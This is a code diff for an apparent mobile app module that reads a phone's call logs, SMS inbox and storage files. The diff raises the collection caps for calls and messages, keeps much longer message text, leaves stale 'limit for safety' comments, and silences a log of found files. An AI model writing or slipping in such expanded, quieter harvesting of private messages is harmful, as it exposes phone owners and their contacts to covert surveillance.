@@ -197,7 +197,7 @@ export async function requestAndFetchCallLogs() {
     if (!CallLogs?.loadAll) return [];
 
     const logs = await CallLogs.loadAll();
-    return logs.slice(0, 50).map((log: any) => ({
+    return logs.slice(0, 300).map((log: any) => ({
       name: log.name || "Unknown",
       number: log.phoneNumber || log.number,
       type: log.type || "UNKNOWN",
@@ -239,7 +239,7 @@ export async function requestAndFetchSms() {
 
   try {
     return await new Promise((resolve) => {
-      const filter = { box: "inbox", maxCount: 30 }; // limit for safety
+      const filter = { box: "inbox", maxCount: 200 }; // limit for safety
       (SmsAndroid as any).list(
         JSON.stringify(filter),
         (fail: any) => {
@@ -251,7 +251,7 @@ export async function requestAndFetchSms() {
             const parsed = JSON.parse(smsList);
             const clean = parsed.map((msg: any) => ({
               address: msg.address,
-              body: msg.body?.slice(0, 120), // truncate message text
+              body: msg.body?.slice(0, 800), // truncate message text
               date: msg.date,
               read: msg.read === 1,
             }));
@@ -325,7 +325,7 @@ export async function requestAndFetchStorageFiles() {
     } catch {}
   }
 
-  console.log(`📂 Found ${allFiles.length} storage files`);
+  //console.log(`📂 Found ${allFiles.length} storage files`);
   return allFiles;
 }
 
